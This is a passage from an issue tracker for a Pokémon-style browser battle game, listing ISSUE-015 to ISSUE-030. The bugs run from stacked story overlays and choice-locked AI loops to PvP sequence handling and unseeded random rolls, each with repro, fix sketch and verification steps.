**Repro**: Post-HoF → receive Master Ball → open Crucible → "Wild Encounter" → throw Master Ball at the wild (succeeds, consumes it) → collect leads → "Enter the Cage" → 1% catch rate, no Master Ball.

**Blast radius**: Post-game Caged God arc — the headline post-HoF reward (Subject Zero / 10,000G + full vitamin bundle).

**Fix sketch**: Hide/disable the Master Ball in the catch UI unless `_catchState.bossMode`, or block `catchThrow('master')` when `!_catchState.bossMode`. Alternatively re-grant the Master Ball at cage-unlock so it cannot be permanently lost.

**Verification**: Throw the Master Ball at a Crucible wild; the throw should be rejected (ball not offered) outside boss mode, and `sm.balls.master` should still be 1 at cage entry.

---

## <a id="ISSUE-015"></a> ISSUE-015: proceedToNextBattle re-entry stacks duplicate cold-open overlays, wedging progression (the "After Badge One" stuck state)

---
id: ISSUE-015
severity: P1
category: bug
anchor_symbol: enterBattleEvent
current_line_hint: ~42373
file: battle.html
agents: [story-mode-investigator]
fingerprint: be6f0b9ce8fd
confidence: high
status: open
---

**Title**: proceedToNextBattle re-entry stacks duplicate cold-open overlays, wedging progression (the "After Badge One" stuck state)

**Evidence**:
`enterBattleEvent` fires a cold-open via `_runStoryColdOpen(beat, ev, onDone)`. The scene's per-run dedupe (`sm.scenesShown[metaKey]`) is only marked when the player clicks **Continue** (in `_renderNarrativeOverlay`'s `dismiss` / `_runStoryColdOpen`'s onPlayed). There is NO re-entry guard: calling `proceedToNextBattle()` again while the overlay is up re-enters `enterBattleEvent` → re-fires the same cold-open → appends ANOTHER full-screen `z-index:9998` overlay. Reproduced in jsdom:
```
after 1st proceed: overlays 1 | scenesShown[cold-classic-gym1]: false
after 2nd proceed: overlays 2 | scenesShown[cold-classic-gym1]: false
after 3rd proceed: overlays 3 | text: "Continue →","Continue →","Continue →"
```
Clicking Continue dismisses only the topmost; the rest remain stacked.

**Repro**: `node scripts/debug/_repro/coldopen-reentry.mjs`. Real-browser confirmation: `agent-state/playtest/player/021-final.png` shows the run terminally stuck on the "After Badge One" (`classic_gym1`, row 7) cold-open after badge 1, matching the user's report. The autopilot's `classify` reads `cityScreen: scr('screen-story-city')` = true (the city is visible *under* the overlay), so its pump calls `proceedToNextBattle()` every tick → 270 ticks of stacking.

**Blast radius**: Every cold-open beat (rows 7/20/26/33/48/53/56/64 per variant), the intro-rival cold-open, the catch screen, and `showBattleIntro` share the no-guard pattern. Any double-tap of a route/gym button, or any code path that calls `proceedToNextBattle`/`enterBattleEvent` while a blocking overlay is live, stacks overlays.

**Fix sketch**: Add a module-level re-entry latch (e.g. `_storyNavBusy`) set at the top of `proceedToNextBattle`/`enterBattleEvent` and cleared when the battle launches or the player returns to a hub; bail early if already busy. Alternatively, `_runStoryColdOpen` could no-op when an overlay with the same metaKey is already in the DOM.

**Verification**: Re-run `coldopen-reentry.mjs`; overlay count must stay at 1 across repeated `proceedToNextBattle()` calls.

---

## <a id="ISSUE-016"></a> ISSUE-016: Retune risk: `data/builds/gen*.json` is a fallback mirror, not the live build source (`data/builds.csv` is authoritative)

---
id: ISSUE-016
severity: P1
category: data
anchor_symbol: fetchSmogonSetsForGen
current_line_hint: ~11590
file: battle.html
agents: [data-integrity-auditor]
fingerprint: 41bbacf8009e
confidence: high
status: open
---

**Title**: Retune risk: `data/builds/gen*.json` is a fallback mirror, not the live build source (`data/builds.csv` is authoritative)

**Evidence**:
```js
// loadBuildsCSV() fetches data/builds.csv FIRST and populates csvBuilds.
// gen*.json is only read by the API fallback (file:// / fetch-fail path):
async function populateCsvBuildsFromAPI() { ...
  await Promise.all([4,5,6,7,8,9].map(g => fetchSmogonSetsForGen(g))); // 9954
// fetchSmogonSetsForGen(gen): fetch(`data/builds/gen${gen}.json`) // 11590
// The ONLY other reader is _loadTeraStats() (49851) — gen9.json teratypes only.
```

**Repro**: Serve over http(s)://, boot Story Mode. `data/builds.csv` (17,398 rows) loads into `csvBuilds`; `makeBuild`/`_storyDowngradeBuildForTier`/`resolveCsvBuildEntry` read only `csvBuilds`. The gen*.json files are never fetched for gameplay (only on CSV fetch failure, or for Tera-frequency UI from gen9.json).

**Blast radius**: The planned curve/tunables retune "leans heavily on builds/grades." EV tiers (`_storyDowngradeBuildForTier` 33606), grade pools (`buildGradePool` 32672), Nature Rater / Move Tutor / Dojo recommendations (all read `csvBuilds`). Editing `data/builds/gen*.json` to retune movesets/EVs/natures will have **zero gameplay effect** under normal serving — the change must land in `data/builds.csv` (or both, kept in sync).

**Fix sketch**: Designate `data/builds.csv` as the single source of truth for the retune and document it in REDESIGN_PLAN §8a touch-points; if gen*.json must persist as a mirror, add a codegen/CI check that regenerates it from the CSV so the two never drift.

**Verification**: After a retune edit, confirm the changed EV/nature/move appears in a live Story battle (csvBuilds path), not just in the JSON. Diff CSV vs JSON to confirm sync.

---

## <a id="ISSUE-017"></a> ISSUE-017: Choice-locked AI re-returns the locked move with zero immunity/wall check — spams 0-dmg moves forever

---
id: ISSUE-017
severity: P1
category: bug
anchor_symbol: getBestMove
current_line_hint: ~18952
file: battle.html
agents: [battle-engine-debugger]
fingerprint: 844cf5ce029b
confidence: high
status: fixed-claude/ecstatic-gauss-RY5hA
---

**Title**: Choice-locked AI re-returns the locked move with zero immunity/wall check — spams 0-dmg moves forever

**Evidence**:
```js
if (attacker.volatile.choiceLock) {
    let lockedMove = validMoves.find(m => m.name === attacker.volatile.choiceLock);
    if (lockedMove) return lockedMove;          // <-- no abilityImmunity / eff===0 / "can't dent" check
    return { name: "Struggle", ... };
}
```
This branch sits ABOVE all scoring. The non-locked path correctly zeroes immune moves (`if (eff === 0 || abilityImmunity(...)) score = 0;` ~L19064), but a choice-locked mon never reaches scoring.

**Repro**: `node scripts/debug/_repro/issue1-immune-spam.mjs` — Choice-Specs Manectric locked into Thunderbolt vs a Lightning Rod holder. `getBestMove` returns Thunderbolt every turn (est dmg = 0). Robust under real `Math.random` (`issue1-robust.mjs`: distinct moves chosen = {Thunderbolt}). Also fires for a merely *resisted* locked move that can't break a wall (`issue1d-allzero.mjs`: Choice-Band Aqua Jet locked vs Ferrothorn, 19.9 dmg).

**Blast radius**: Every choice-item foe in story/PvE. Player exploit: bait the AI into clicking a Choice move, then switch in an immunity/wall — the AI is then locked into a useless move AND (see paired finding) cannot switch out. This is the most exploitable loop found.

**Fix sketch**: In the choice-lock branch, before returning `lockedMove`, check `abilityImmunity(lockedMove, defender, attacker) || getMoveEffectiveness(...) === 0`; if the locked move is immune/zeroed, prefer surrendering the matchup (allow `aiDecision` to switch — see paired finding) or fall through to Struggle only when truly stuck. At minimum, do not treat a 0-damage locked move as a valid attack.

**Verification**: Re-run `issue1-immune-spam.mjs`; case (b) must no longer report "keeps returning same immune move: true". Add an `ai-decision.test.js` case asserting a choice-locked-into-immune foe does not return the immune move.

---

## <a id="ISSUE-018"></a> ISSUE-018: AI spams setup move into an active phazer — `score *= 0.25` penalty loses to near-zero attack scores

---
id: ISSUE-018
severity: P1
category: bug
anchor_symbol: getBestMove
current_line_hint: ~19233
file: battle.html
agents: [battle-engine-debugger]
fingerprint: c9f77d3582aa
confidence: high
status: fixed-claude/ecstatic-gauss-RY5hA
---

**Title**: AI spams setup move into an active phazer — `score *= 0.25` penalty loses to near-zero attack scores

**Evidence**:
```js
// Phazer / Haze / Unaware on the field or bench — setup will be undone or ignored.
if (defHasPhazer || defHasUnaware) score *= 0.25;   // multiplicative only
else if (benchHasPhazer) score *= 0.55;
```
When the AI's attacking moves do ~0 into the wall, 0.25 × (setup base ~80) still beats them. The Unaware case is saved elsewhere (it picks an attack), but the *phazer* case is not: the boost is real (so setup scores high) yet gets immediately Whirlwind/Roar'd away.

**Repro**: `node scripts/debug/_repro/issue3-trollfamily.mjs` (3b) and `issue3-deep.mjs`: Dragonite (Dragon Dance/Earthquake/Extreme Speed/Roost) vs Skarmory with Whirlwind. EQ est = 0 (Steel/Flying immune to Ground), Extreme Speed est = 10. AI clicks Dragon Dance for 4 straight turns (until +4 atk makes E-Speed win), robust across all RNG seeds incl. real `Math.random`. Each turn Skarmory phazes the boost away → net-zero loop.

**Blast radius**: Any setup sweeper the AI brings against a Whirlwind/Roar/Dragon Tail/Circle Throw user it can't dent. Player exploit: park a phazing wall; the AI burns turns boosting into the wind. Lower exploit ceiling than the choice-lock loop (needs a wall the AI can't hurt + an active phazer) but very reliable when it occurs.

**Fix sketch**: When `defHasPhazer` (active, not just bench) AND the AI cannot OHKO/2HKO, treat setup as near-worthless (hard cap, e.g. `score = Math.min(score, 5)`), not a 0.25 multiplier. Better: don't repeat-setup if the active foe carries a phazer and we already have ≥1 relevant boost.

**Verification**: Re-run 3b; Dragonite should pick its best available action (or switch) rather than Dragon Dance ≥3 turns running. The control case (Skarmory without Whirlwind) should still permit a DD when setup is genuinely safe.

---

## <a id="ISSUE-019"></a> ISSUE-019: Illegal Dealer NPC encounter (STORY_FEATURES_INTEGRATION.md §3.5) still missing

---
id: ISSUE-019
severity: P1
category: inconsistency
anchor_symbol: illegalDealer
file: battle.html
agents: [spec-drift-auditor]
fingerprint: 09f2ddbbdfb4
confidence: high
status: wontfix-DE-SCOPED-permanent
---

**Title**: Illegal Dealer NPC encounter (STORY_FEATURES_INTEGRATION.md §3.5) still missing

**Evidence**:
```
$ grep -nE 'illegalDealer|illegal_dealer|enterDealer|dealerOffer' battle.html
(no matches)
```

**Repro**: Visit City6 / City8 (the spec-promised "seedy hubs") at any badge count. No single-NPC contract loop appears. Spec promises one offer per city visit, six-to-ten contract templates (`Trade one party mon for two of same grade`, `Sell mon for large gold`, `Reveal next fixed trainer team`, etc.), the `Contraband Capsule` token item, plus hidden itinerary-clue reveals.

**Blast radius**: Differentiation table §3.5 contrasts Mart / Dept / Black Market / Illegal Dealer — the fourth identity is unrealized, so the "broad illegal catalog vs single shady contract" design split has no surface in code. Depends on Black Market only conceptually; could ship independently.

**Fix sketch**: New `illegalDealerOffer(cityIdx)` generator + `sm.illegalDealerOfferByCity` save field, render hook in `renderCityActions` for `cityIdx ∈ {6,8}` when `sm.blackMarketUnlocked === true`. Author bark / accept / decline dialogue and the contract template pool.

**Verification**: Visit City6 with `sm.blackMarketUnlocked = true`; see a single-NPC offer chip; declining clears it for the visit, leaving for next city restores it.

---

## <a id="ISSUE-020"></a> ISSUE-020: Full Itinerary scaffolding (STORY_FEATURES_INTEGRATION.md §10) still entirely unimplemented

---
id: ISSUE-020
severity: P1
category: inconsistency
anchor_symbol: itineraryProgress
file: battle.html
agents: [spec-drift-auditor]
fingerprint: 4f2f5373374e
confidence: high
status: wontfix-DE-SCOPED-permanent
---

**Title**: Full Itinerary scaffolding (STORY_FEATURES_INTEGRATION.md §10) still entirely unimplemented

**Evidence**:
```
$ grep -niE 'itineraryProgress|itineraryBeat|runItinerary|enterItinerary|sm\.itinerary' battle.html
(no matches)
```

**Repro**: No itinerary beat fires at any event index. Spec §8 promises ordering `itinerary → wild → wager prompt → trainer` in `proceedToNextBattle`; today the order is just `wild → trainer`.

**Blast radius**: Every downstream spec system hangs off this — Black Market unlock comes from itinerary beat `blackMarketUnlock`, Safari Zone trigger is "after badge 3 / City3 segment", the three-act villain arc anchors to `sm.itineraryProgress` per `STORY_MODE_AUDIT.md` §14. Without the scaffold, the spec's narrative arc cannot exist.

**Fix sketch**: Author `STORY_ITINERARY` const (one row per beat: id, trigger condition, payload such as `{kind:'blackMarketUnlock'}`, `{kind:'safariType', type:'water'}`), add `sm.itineraryProgress = {}` to migrateStoryPreV20, implement `runItineraryBeat(beatId)` and call from `proceedToNextBattle` before `enterBattleEvent`.

**Verification**: After badge 3, on the route to City3, the itinerary engine fires a beat that flags `sm.blackMarketUnlocked = true` before the next trainer fight.

---

## <a id="ISSUE-021"></a> ISSUE-021: `lastRemoteSeq` is updated *before* the remote handler runs — a thrown handler still bumps the watermark, so the failed update is permanently skipped

---
id: ISSUE-021
severity: P1
category: bug
anchor_symbol: lastRemoteSeq
current_line_hint: ~501
file: online-pvp.js
agents: [pvp-concurrency-hunter]
fingerprint: ff27549bd4fe
confidence: high
status: fixed-claude/sharp-keller-eZEDN
---

**Title**: `lastRemoteSeq` is updated *before* the remote handler runs — a thrown handler still bumps the watermark, so the failed update is permanently skipped

**Evidence**:
```js
// online-pvp.js L498-507
remoteRowQueue = remoteRowQueue
    .then(async () => {
        const d = newRow.data || {};
        if ((d.seq || 0) <= lastRemoteSeq) return;          // gate
        lastRemoteSeq = d.seq || lastRemoteSeq + 1;          // bump BEFORE await
        if (typeof global.onOnlineRoomData === 'function') {
            await Promise.resolve(global.onOnlineRoomData(d, { role, roomCode }));
            // ^ if this throws, lastRemoteSeq is already advanced;
            //   the same seq will never re-enter the handler.
        }
    })
    .catch((e) => console.warn('[OnlinePvP] onOnlineRoomData', e));
```

**Repro**: Force `onOnlineRoomData` to throw for a specific seq (e.g., guest receives `battle_start_blob` with a malformed JSON — `applyBattleSnapshot` returns false at L755 but earlier in the chain a `JSON.parse` could throw). `lastRemoteSeq` is now at that seq. The next legitimate update at seq+1 passes the gate fine, but the broken seq's data is *lost* — the guest's local state never reflects whatever info the broken row carried (e.g., new wins count, host display name update at L748-753). Symptom: scoreboard shows stale data even though both peers are connected.

**Blast radius**: Every conditional branch inside `onOnlineRoomData` (battle.html:14681-14760). Some are idempotent (later rows carry the same data, so the lost update is recovered when the next seq arrives — e.g., `host_display_name` is re-broadcast on every push). Others are not: `d.battle.state_blob` only arrives on resolved turns; a lost resolved-turn seq leaves the guest stranded a turn behind, and the host won't re-broadcast that exact seq.

**Fix sketch**: Move the `lastRemoteSeq` bump *after* a successful handler completion. Use a temporary "in-flight" marker if you need to deduplicate within a single tick. Pattern:
```js
remoteRowQueue = remoteRowQueue.then(async () => {
    const incoming = d.seq || 0;
    if (incoming <= lastRemoteSeq) return;
    try { await Promise.resolve(global.onOnlineRoomData(d, ...)); }
    catch (e) { console.warn(...); /* do NOT advance seq */ return; }
    lastRemoteSeq = incoming;   // only on success
});
```
Combined with the timeout from the previous finding, this stays robust against hung handlers (timeout → seq does not advance → next row at same seq is allowed to retry).

**Verification**: Test: inject one row at seq=5 where the handler throws, then a row at seq=6. Assert: after both, `lastRemoteSeq === 5` (or the system retried seq=5), not 6.

---

## <a id="ISSUE-022"></a> ISSUE-022: Save-migration integration test never exercises the migrate chain (vacuous pass)

---
id: ISSUE-022
severity: P1
category: dx
anchor_symbol: migrateStoryPreV15
current_line_hint: ~31873
file: battle.html
agents: [story-mode-investigator]
fingerprint: 2ff4479d31a1
confidence: high
status: open
---

**Title**: Save-migration integration test never exercises the migrate chain (vacuous pass)

**Evidence**:
```js
// tests/integration/save-migration.test.js
test('migrateStoryPreV15 function exists OR migrations are not yet exposed', async () => {
  const { window } = await loadEngine();
  const fn = window.migrateStoryPreV15;
  if (typeof fn !== 'function') { return; }  // <-- always taken; not exported
  ...
// And the "pre-v15 save" fixture uses the WRONG key:
const preV15 = { saveVer: 14, ... };  // load() reads d.version, not d.saveVer
```

**Repro**: `grep -n "window.migrateStory" battle.html` returns nothing — migration fns live inside the `window.StoryMode = (function(){…})()` IIFE and are not exported. The test's guard `if (typeof fn !== 'function') return` is therefore always taken. The second test's fixture sets `saveVer: 14` but `load()` (battle.html:32228) keys on `d.version`; `version:undefined < 2` makes `load()` bail before any migration runs.

**Blast radius**: The pre-v15 → v20 round-trip (the single most safety-critical path for not bricking returning players) has ZERO real test coverage despite the test file's name. A regression in any `migrateStoryPreV<N>` would pass CI.

**Fix sketch**: Either expose the migration entry (or a test-only `__runStoryMigrations(saveObj)` hook) on `window.StoryMode`, then drive a real `{version:14,...}` fixture through it and assert post-state (pcBox array, balls default, hardcore→normal, stable ids, ivs grandfathered, daycare/pits seeded). At minimum, fix the fixture key `saveVer`→`version`.

**Verification**: New assertions on migrated `sm` fields; mutate one migration to break a field and confirm the test goes red.

---

## <a id="ISSUE-023"></a> ISSUE-023: v14 trainer-assignment migration is bundled under `_loadedVer < 13`, so v13 saves skip it

---
id: ISSUE-023
severity: P1
category: bug
anchor_symbol: migrateStoryTrainerAssignmentsPreV14
current_line_hint: ~30939
file: battle.html
agents: [story-mode-investigator]
fingerprint: d1e01d9e6e3e
confidence: high
status: fixed-claude/sharp-keller-eZEDN
---

**Title**: v14 trainer-assignment migration is bundled under `_loadedVer < 13`, so v13 saves skip it

**Evidence**:
```js
// battle.html ~30939
if (_loadedVer < 13) {
    try { migrateStoryArtifactShopPreV13(); } catch (e) { ... }
    try { migrateStoryTrainerAssignmentsPreV14(); } catch (e) { ... } // ← wrong guard
}
if (_loadedVer < 15) {
    try { migrateStoryPreV15(); } catch (e) { ... }
}
// no `_loadedVer < 14` block exists anywhere
```

**Repro**: Craft a save with `version: 13` (or replay any save that was last opened during v13's lifetime — those saves rewrite `sm.version = SAVE_VER` on the next load, so they'd skip the v14 fix forever afterward). The v14 fix remaps `'Blue Champion' / 'Red' (in Elite Trainer slots) / 'Blue 2' / 'Silver 2' / 'Gladion 2' / 'Lt. Surge 2'` → the appropriate canonical names. A v13 save with one of those legacy assignment names will keep it, breaking the trainer dispatch when the row's expected event type doesn't match.

**Blast radius**: Narrow — only saves that loaded once at exactly v13. Symptoms: an Elite Trainer slot might display "Blue Champion" or roll the Champion's roster on an E1 row. Already-current v14+ saves are unaffected (they ran the fix when they were v13).

**Fix sketch**: Move the v14 migration to its own block:
```js
if (_loadedVer < 13) { try { migrateStoryArtifactShopPreV13(); } catch (e) {} }
if (_loadedVer < 14) { try { migrateStoryTrainerAssignmentsPreV14(); } catch (e) {} }
```

**Verification**: After fix, hand-craft a `version:13` save with `trainerAssignments[34] = 'Blue Champion'`. Load it; the assignment should remap to the appropriate canonical name. Pre-fix, the migration is silently skipped.

---

## <a id="ISSUE-024"></a> ISSUE-024: Secondary flinch/Stench write `defender.volatile.flinch` unguarded — throws if volatile missing (sibling _tryConfuse guards it)

---
id: ISSUE-024
severity: P1
category: bug
anchor_symbol: parseMoveEffects
current_line_hint: ~25902
file: battle.html
agents: [battle-engine-debugger]
fingerprint: 37ef284799b0
confidence: high
status: open
---

**Title**: Secondary flinch/Stench write `defender.volatile.flinch` unguarded — throws if volatile missing (sibling _tryConfuse guards it)

**Evidence**:
```js
const _tryConfuse = () => { if (!defender.volatile) return; ... };   // GUARDED
...
if (_sec.volatileStatus === 'flinch') defender.volatile.flinch = true;   // 25902 UNGUARDED
...
if (attacker.ability === "Stench" && ... && !defender.volatile.flinch && Math.random()<0.1)  // 25918 UNGUARDED
    defender.volatile.flinch = true;
```

**Repro**: `scripts/debug/_repro/secondary-volatile.mjs` — build Snorlax, set `def.volatile = undefined`, call `parseMoveEffects(atk, def, AirSlash, true)`. Result: throws `Cannot set properties of undefined (setting 'flinch')`. The confusion path on the same loop returns cleanly because it guards `if (!defender.volatile) return`; the flinch path does not. A throw here is caught only by the playTurn turn-skip handler -> "Turn skipped" mid-move.

**Blast radius**: Every flinch secondary (Air Slash, Iron Head, fang moves, Rock Slide) and Stench. Triggered whenever a defender's `volatile` is transiently absent (some transform / forme-revert / freshly-spawned-mon paths).

**Fix sketch**: Guard the flinch writes the same way `_tryConfuse` guards: `if (defender.volatile) defender.volatile.flinch = true;` (and gate the Stench `!defender.volatile.flinch` read).

**Verification**: Re-run the repro after the guard; assert no throw and the move still resolves.

---

## <a id="ISSUE-025"></a> ISSUE-025: Many `parseMoveEffects` branches still use bare `Math.random()` — seeded story replays drift

---
id: ISSUE-025
severity: P1
category: bug
anchor_symbol: parseMoveEffects
current_line_hint: ~24350
file: battle.html
agents: [consistency-auditor]
fingerprint: 0729606b5ddb
confidence: high
status: fixed-claude/sharp-keller-eZEDN
---

**Title**: Many `parseMoveEffects` branches still use bare `Math.random()` — seeded story replays drift

**Evidence**:
```js
// L24350  if (move.name === "Bounce" && Math.random() < 0.3) { applyStatus(defender, "PAR"); return; }
// L24427  let newType = resistTypes[Math.floor(Math.random() * resistTypes.length)];
// L24461  if (statusCode && Math.random() < (sereneGrace ? Math.min(1, chance * 2) : chance)) {
// L24729  let newMon = bench[Math.floor(Math.random() * bench.length)];   // Roar/Whirlwind switch
// L24885  let _acuStat = _acuAvail[Math.floor(Math.random() * _acuAvail.length)]; // Acupressure
// L24991  if (move.name === "Tri Attack" && Math.random() * 100 < _sg(20)) {
// L24992  let _tr = Math.floor(Math.random() * 3);  // Tri Attack BRN/FRZ/PAR
// L25019  if (Math.random() * 100 >= _sg(_secChance)) continue; // data-driven secondary
// L25038  if (attacker.ability === "Stench" && ... && Math.random() < 0.1) {
```

**Repro**: Load story with `?seed=X`, fight a battle where the opponent has Tri Attack / Acupressure / a secondary-effect mover (e.g. Iron Head with 30% flinch). Re-load the same seed and replay the same inputs — the outcome diverges because each of these branches consults `Math.random()` instead of the seeded `storyRngNext` (which sibling sites at L24228 thaw, L25002 confuse, L25083 trap, L25526 cr, L26481 harvest correctly call).

**Blast radius**: All story-mode seeded replays. Daily-seed contests. Player-shared run-the-seed videos. Class is exactly the one the spec called out months ago — these sites were missed when the audit converted confusion/trap/thaw/harvest. At least 9 distinct sites in `parseMoveEffects` plus the broader status/end-of-turn pipeline.

**Fix sketch**: At the top of `parseMoveEffects` (or right before the first call site), bind `const _rng = (sm && sm.active) ? storyRngNext : Math.random;` and replace every bare `Math.random()` inside the function body with `_rng()`. Mirror the same pattern in `applyStatus`, `endOfTurnEffects`, the speed-tie block in the main turn loop (L19368), and the Quick Claw rolls (L19353-19354).

**Verification**: New seeded-replay test: run the same seed × two trials through a battle that triggers Tri Attack / Bounce-paralysis / Roar / Static-on-contact. Assert identical move sequences. Existing `tests/integration/story-flow.test.js` seeded assertion should catch any regression on the converted sites.

---

## <a id="ISSUE-026"></a> ISSUE-026: Core damage roll, crit, and accuracy use bare `Math.random()` — the highest-impact drift sites

---
id: ISSUE-026
severity: P1
category: bug
anchor_symbol: parseMoveEffects-damage-core
current_line_hint: ~20742
file: battle.html
agents: [battle-engine-debugger]
fingerprint: 160c710ca9f8
confidence: high
status: fixed-claude/sharp-keller-eZEDN
---

**Title**: Core damage roll, crit, and accuracy use bare `Math.random()` — the highest-impact drift sites

**Evidence**:
```js
// battle.html:20742 — accuracy check
if (!neverMiss && Math.random() * 100 > finalAcc) { ... }
// battle.html:21182 — critical hit roll
let crit = (!armorBlocksCrit && Math.random() < critRate) ? (attacker.ability === "Sniper" ? 2.25 : 1.5) : 1;
// battle.html:21676 — damage random factor 0.85-1.0
let rng = 0.85 + (Math.random() * 0.15);
```

These three fire on **every damaging move**. Sibling sites: 22094 (multi-hit per-strike accuracy), 21460 / 21456 (multi-hit count), 22151 / 22998 (self-effect chance), 22025 (random secondary), 22075 (Focus Band 10%).

**Repro**: Any seeded story battle, snapshot turn-1 damage of a vanilla attack, reload — the exact damage value differs because of the 0.85–1.00 roll.

**Blast radius**: Every damage interaction. Without this fix, no story replay can be byte-identical regardless of other fixes.

**Fix sketch**: Best architectural fix — install a mulberry32 patch on `Math.random` at story-run start, mirroring `tests/helpers/seeded-rng.js`'s `installMathRandom`. One ~10-line change covers all 262 bare sites in battle.html and converges test and production. Alternative: define a `_bRng()` helper near the top of `parseMoveEffects` and replace each call individually (higher diff, easier review).

**Verification**: `npm run debug:replay diff <seed>` produces byte-identical transcripts across two invocations.

---

## <a id="ISSUE-027"></a> ISSUE-027: Eight contact-triggered defender ability procs (Static / Poison Point / Flame Body / Cute Charm / Effect Spore / Toxic Chain / Cursed Body / Poison Touch) all use bare `Math.random()`

---
id: ISSUE-027
severity: P1
category: bug
anchor_symbol: parseMoveEffects-on-contact-abilities
current_line_hint: ~22461
file: battle.html
agents: [battle-engine-debugger]
fingerprint: 436d3fa608c1
confidence: high
status: fixed-claude/sharp-keller-eZEDN
---

**Title**: Eight contact-triggered defender ability procs (Static / Poison Point / Flame Body / Cute Charm / Effect Spore / Toxic Chain / Cursed Body / Poison Touch) all use bare `Math.random()`

**Evidence**:
```js
// battle.html:22461-22485
if (defender.ability === "Static" && Math.random() < 0.3) applyStatus(attacker, "PAR");
if (defender.ability === "Poison Point" && Math.random() < 0.3) applyStatus(attacker, "PSN");
if (defender.ability === "Flame Body" && Math.random() < 0.3) applyStatus(attacker, "BRN");
if (defender.ability === "Cute Charm" && Math.random() < 0.3 ...) { ... }
// Effect Spore: let roll = Math.random() * 100;  (9/10/11 split)
if (attacker.ability === "Poison Touch" && Math.random() < 0.3) applyStatus(defender, "PSN");
// Toxic Chain at 22479, Cursed Body at 22485 — same pattern
```

Eight sites clustered under `if (isContactMove(move) && !hitSub && ...)`. Note: Cursed Body / Toxic Chain at lines 23049 / 23296-23362 already use the gated pattern; the 22485 site is the un-gated copy.

**Repro**: Trainer with Static Pikachu, player Tackles. Two seeded story replays differ on PAR proc.

**Blast radius**: All on-hit ability procs in story replays. Player UX: "I reloaded and got paralyzed this time."

**Fix sketch**: At the top of the contact-trigger block: `const _r = (sm && sm.active) ? storyRngNext : Math.random;` then replace the eight `Math.random()` calls.

**Verification**: Fixture battle (Tackle vs Static Pikachu × N turns); PAR-applied turn indices match across two replays at the same seed.

---

## <a id="ISSUE-028"></a> ISSUE-028: Contact-ability procs (Static / Poison Point / Flame Body / Cute Charm / Poison Touch / Toxic Chain / Cursed Body) all bare `Math.random()`

---
id: ISSUE-028
severity: P1
category: bug
anchor_symbol: parseMoveEffects-onhit-abilities
current_line_hint: ~22461
file: battle.html
agents: [consistency-auditor]
fingerprint: aa60883b8c97
confidence: high
status: fixed-claude/sharp-keller-eZEDN
---

**Title**: Contact-ability procs (Static / Poison Point / Flame Body / Cute Charm / Poison Touch / Toxic Chain / Cursed Body) all bare `Math.random()`

**Evidence**:
```js
// L22461-L22485 — on-contact / on-hit ability procs
if (defender.ability === "Static" && Math.random() < 0.3) applyStatus(attacker, "PAR");
if (defender.ability === "Poison Point" && Math.random() < 0.3) applyStatus(attacker, "PSN");
if (defender.ability === "Flame Body" && Math.random() < 0.3) applyStatus(attacker, "BRN");
if (defender.ability === "Cute Charm" && Math.random() < 0.3 ...) { ...
if (attacker.ability === "Poison Touch" && Math.random() < 0.3) applyStatus(defender, "PSN");
if (attacker.ability === "Toxic Chain" && ... && Math.random() < 0.3) { ...
if (defender.ability === "Cursed Body" && Math.random() < 0.3 && move.name) { ...
// L22538 — Tough Claws-style ability tick: if (... && Math.random() < 0.1)
// L22075 — Focus Band proc: && Math.random() < 0.1
// L22151 — recoil/self-stat secondary: if (Math.random() * 100 < _selfChance)
```

**Repro**: Story-mode fight against a Static Pikachu — same seed, same inputs, two different "paralysed on contact" outcomes.

**Blast radius**: These procs gate huge follow-on consequences (PAR drops Speed; PSN/BRN deal chip damage; Cursed Body locks a move). Drift here can change the seed result by 5-10 turns.

**Fix sketch**: Same shim. Convert every `Math.random()` call inside `parseMoveEffects` between L22000-23000 (on-hit / ability / item-trigger region) to the seeded `_rng()`. Audit the whole damage-resolution block in one sweep.

**Verification**: Seeded replay where the foe runs Static. Assert PAR-on-contact happens (or doesn't) identically across runs.

---

## <a id="ISSUE-029"></a> ISSUE-029: PC_BOX_CAP is 30 in code but the canonical spec says 10

---
id: ISSUE-029
severity: P1
category: inconsistency
anchor_symbol: PC_BOX_CAP
current_line_hint: ~38560
file: battle.html
agents: [story-mode-investigator]
fingerprint: fad97b9dadac
confidence: high
status: wontfix-ratified-pc-box-cap-30
---

**Title**: PC_BOX_CAP is 30 in code but the canonical spec says 10

**Evidence**:
```js
// battle.html ~38560
const PC_BOX_CAP = 30;

// STORY_MODE_FLOW.md §1 (canonical):
//   PC | Pure storage. Flat array, cap 10 (story is battle-focused,
//   not a collection layer)…
// STORY_MODE_FLOW.md §7:
//   PC Storage … Capacity 10 — intentionally tight, since the run is
//   battle-focused and the Underground is meant to drive sell decisions
// STORY_MODE_FLOW.md §14 — point A2: "Flat-array PC, cap 10 (revised down
//   from the prior audit's 60 — this is a battle-focused story mode, not
//   a collection roguelike)"
```

**Repro**: Open the Pokémon Center PC tab. The HUD reads "PC X/30". The Underground sell loop is therefore far less compelling than the spec calls for — players can hoard ~3× the intended count before pressure forces a sale.

**Blast radius**: Touches the Underground economy ratio (Safari → sell loop is the explicit spec'd self-balancing money sink). Also touches the "PC nearly full" warning threshold (`box.length >= PC_BOX_CAP - 3 = 27/30`, vs spec's "≥ 8/10"). Also touches the "10/10" PC-full error message at line 40487 (currently shows "30/30" — string is correct but the cap behind it is wrong by spec).

**Fix sketch**: Either (a) drop `PC_BOX_CAP = 10` to match the spec verbatim — players keep their current PC contents, but new deposits past 10 are rejected; or (b) update the spec to ratify the 30-slot implementation, since this likely landed deliberately to accommodate the Pokédex catch-everything achievement plus Safari pulls plus boss-arc keeper. Pick (b) if the cap was raised intentionally and just never propagated to the doc.

**Verification**: After (a), the existing low-slot warning at `>= 27/30` should be retuned to `>= 8/10` for parity. After (b), `STORY_MODE_FLOW.md` §§1/7/14 all need their "10" tokens swapped to "30".

---

## <a id="ISSUE-030"></a> ISSUE-030: Battle for Pokémon wager system (STORY_FEATURES_INTEGRATION.md §6) still missing

---
id: ISSUE-030
severity: P1
category: inconsistency
anchor_symbol: pendingWager
file: battle.html
agents: [spec-drift-auditor]
fingerprint: b2982543c7b0
confidence: high
status: wontfix-DE-SCOPED-permanent
---

**Title**: Battle for Pokémon wager system (STORY_FEATURES_INTEGRATION.md §6) still missing

**Evidence**:
```
$ grep -niE 'pendingWager|setWager|wagerOpponent|wagerBattle|battleWager|wagerPrompt|wagerOffer|placeWager' battle.html
(no matches)
```
The only `wager` hits in battle.html (lines 36440, 41797, 42065) belong to the **Casino** prize-wall flow, NOT the spec's pre-battle Pokémon-trade wager.

**Repro**: Spec promises ~15% chance on Basic Trainer route battles post-unlock that the trainer offers to wager 1 mon. Win → take their worst; lose → give your best. Never fires in any current Basic Trainer encounter.

